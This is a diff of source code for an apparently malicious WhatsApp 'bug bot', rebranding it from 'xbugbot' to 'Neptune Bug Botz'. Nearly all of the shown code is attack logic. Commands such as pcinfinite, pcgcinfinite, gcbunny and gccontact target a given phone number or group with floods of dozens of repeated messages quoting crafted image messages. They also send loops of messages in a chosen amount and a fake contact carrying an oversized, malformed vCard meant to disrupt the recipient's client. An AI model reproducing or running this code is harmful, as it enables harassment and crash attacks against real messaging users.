-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcinfinitexeon})
             break
 case 'pcinfinite':               
            	if (isBan) return reply(mess.ban)
@@ -8650,36 +8649,36 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcinfinite 91xxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️`,
                             "jpegThumbnail": thumb
                         } 
                     } 
                 }
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcinfinitexeon})
             reply(mess.success)
             break
                    case 'pcgcinfinite':               
@@ -8697,65 +8696,65 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcinfinite 91xxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️`,
                             "jpegThumbnail": thumb
                         } 
                     } 
                 }
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pcgcinfinitexeon})
             break
 case 'gcbunny': {            
            	if (isBan) return reply(mess.ban)
@@ -8789,7 +8788,7 @@ case 'gcbunny': {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️`,
                             "jpegThumbnail": thumb
                         } 
                     } 
@@ -8833,7 +8832,7 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcbunny 91xxxxxxxxxx`
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️`,
                             "jpegThumbnail": thumb
                         } 
                     } 
@@ -8884,7 +8883,7 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcbunny 91xxxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️`,
                             "jpegThumbnail": thumb
                         } 
                     } 
@@ -8919,8 +8918,8 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcbunny 91xxxxxxxxx
 if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-kwkwkx = '``🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot``',
-NepBotzInc.sendMessage(m.chat, {text: kwkwkx, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Xeon Ezy☣️',previewType:"PHOTO",thumbnail: thumb,sourceUrl:websitex}}})
+kwkwkx = '``☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️``',
+NepBotzInc.sendMessage(m.chat, {text: kwkwkx, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Neptune.exe ☣️',previewType:"PHOTO",thumbnail: thumb,sourceUrl:websitex}}})
 }
 }
 break
@@ -8932,7 +8931,7 @@ case 'gccontact': {
 if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-const fakeContacts = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot ${xeonbrutal(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:Xeon Ezy☣️\nitem1.TEL:+916909137213\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 